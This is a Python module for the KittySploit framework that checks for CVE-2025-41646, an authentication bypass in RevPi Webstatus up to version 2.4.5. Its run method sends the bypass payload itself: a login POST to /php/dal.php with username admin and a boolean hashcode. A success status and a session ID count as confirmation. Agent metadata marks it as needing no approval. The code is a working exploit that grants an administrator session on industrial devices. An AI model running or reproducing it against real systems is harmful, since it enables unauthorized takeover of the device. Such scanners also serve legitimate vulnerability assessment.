#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An unauthorized remote attacker can bypass the authentication of the affected software package by misusing an ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'RevPi Webstatus <= v2.4.5 - Authentication Bypass Detection',
        'description': 'An unauthorized remote attacker can bypass the authentication of the affected software package by misusing an incorrect type conversion. This leads to full compromise of the device',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'kunbus', 'revpi-status', 'auth-bypass', 'revpi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://psirt.kunbus.com/.well-known/csaf/white/2025/kunbus-2025-0000003.json',
            'https://x.com/win3zz/status/1940397684176904607',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-41646',
        ],
        'cve': 'CVE-2025-41646',
    }

    def run(self):
        path = '/php/dal.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{"mode":"LOGIN","username":"admin","hashcode":true}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"status":"SUCCESS"', '"sessionId":',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='RevPi Webstatus <= v2.4.5 - Authentication Bypass detected', path=path)
            return True
        return False

